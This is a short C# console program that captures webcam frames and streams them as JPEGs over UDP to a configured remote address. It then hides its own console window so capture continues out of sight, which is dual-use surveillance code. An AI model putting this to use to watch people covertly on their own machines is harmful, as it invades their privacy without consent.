using System;
using System.Collections.Generic;
using System.Configuration;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using AForge.Video.DirectShow;
using System.IO;
using System.Drawing.Imaging;
using System.Net.Sockets;
using System.Runtime.InteropServices;

namespace SendInformationFromWeb
{
    class Program
    {
        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);


        private static IPEndPoint informatorPoint;
        private static UdpClient udpClient = new UdpClient();
        static void Main(string[] args)
        {
            var sendAppIP = ConfigurationManager.AppSettings.Get("sendAppIP");
            var sendAppPORT = int.Parse(ConfigurationManager.AppSettings.Get("sendAppPORT"));
            informatorPoint = new IPEndPoint(IPAddress.Parse(sendAppIP), sendAppPORT);
            
            Console.WriteLine($"Scout: {informatorPoint}");

            FilterInfoCollection videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
            VideoCaptureDevice videoSource = new VideoCaptureDevice(videoDevices[0].MonikerString);// 0 - WebCamera by default;
            videoSource.NewFrame += VideoSource_NewFrame;
            videoSource.Start();

            Console.WriteLine("\nPress Enter to hide the console...");
            Console.ReadLine();

            ShowWindow(GetConsoleWindow(), SW_HIDE);
        }

        private static void VideoSource_NewFrame(object sender, AForge.Video.NewFrameEventArgs eventArgs)
        {
            var bmp = new Bitmap(eventArgs.Frame, 800, 600);//we are decreasing image = 800*600 otherwise if image will high quality there'll be error
            try
            {
                using(var ms = new MemoryStream())
                {
                    bmp.Save(ms, ImageFormat.Jpeg);
                    var bytes = ms.ToArray();
                    udpClient.Send(bytes, bytes.Length, informatorPoint);
                }
            }
            catch (Exception)
            {

                throw;
            }
        }
    }
}
